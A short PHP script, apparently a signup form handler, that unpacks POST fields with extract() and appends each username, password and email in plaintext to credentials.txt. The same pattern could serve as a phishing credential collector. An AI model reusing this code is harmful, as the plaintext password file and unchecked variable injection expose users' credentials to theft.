<?php
	extract($_POST);
	$file=fopen("credentials.txt","a+");
	$text=$uname.":".$passwd.":".$email."\n";
	fwrite($file,$text);
	fclose($file);
	echo "<script>parent.onsignup();</script>";
?>
